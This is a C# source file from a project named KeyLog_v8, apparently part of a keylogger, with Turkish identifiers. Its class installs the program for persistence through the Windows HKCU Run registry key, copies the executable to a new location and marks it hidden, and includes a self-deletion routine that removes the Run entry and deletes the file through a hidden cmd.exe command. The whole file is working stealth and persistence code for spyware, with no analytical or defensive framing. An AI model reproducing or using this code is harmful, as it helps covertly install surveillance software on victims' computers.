using System;
using System.Collections.Generic;
using System.Text;

using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;

namespace KeyLog_v8
{
    class AppRegister
    {
        public string _konumu;
        public string _ismi;
        public string _aciklamasi;
        public AppRegister(string dosyaKonumu, string dosyaIsmi, string dosyaAciklamasi)
        {
            _konumu = dosyaKonumu;
            _ismi = dosyaIsmi;
            _aciklamasi = dosyaAciklamasi;
        }

        public bool Kaydet()
        {
            bool regSonuc = RegeditKontrol();
            bool dosSonuc = true;
            if (!regSonuc)
            {
                regSonuc = RegeditKaydet();
                dosSonuc = DosyaKaydet();
            }

            if (regSonuc && dosSonuc)
                return true;
            else
                return false;
        }

        bool RegeditKontrol()
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", false);
            if (key.GetValue(_aciklamasi) != null)
            {
                //Dize Değeri türündeki değer string olarak kullanılabilir
                string regdekiKonum = key.GetValue(_aciklamasi).ToString();
                if (Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath) == regdekiKonum)
                {
                    Console.Write("--> Kayıtlı Yerden Basladı\n");
                    return true;
                }
                else
                {
                    Console.Write("--> Baska Aygittan Baslatildi\n");
                    return false;
                }
            }
            else
                return false;
        }

        bool RegeditKaydet()
        {
            try
            {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    _aciklamasi,
                    _konumu + _ismi);
                return true;
            }
            catch
            {
                return false;
            }
        }

        bool DosyaKaydet()
        {
            try
            {
                File.Copy(Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath),
                   _konumu + _ismi,
                   true);
                File.SetAttributes(_konumu + _ismi,
                    File.GetAttributes(_konumu + _ismi) | FileAttributes.Hidden);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool DosyaKaydet(string konum,string isim)
        {
            try
            {
                File.Copy(Path.GetDirectoryName(Application.ExecutablePath) + "\\" + Path.GetFileName(Application.ExecutablePath),
                   konum + isim,
                   true);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public void KendiniSil(string silmeSuresiSaniye)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.DeleteValue(_aciklamasi);

                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C choice /C Y /N /D Y /T " + silmeSuresiSaniye + " & Del " + Application.ExecutablePath;
                process.StartInfo = startInfo;
                process.Start();
                Console.WriteLine("Siliniyor...");
                Application.Exit();
            }
            catch
            {

            }
        }
    }
}
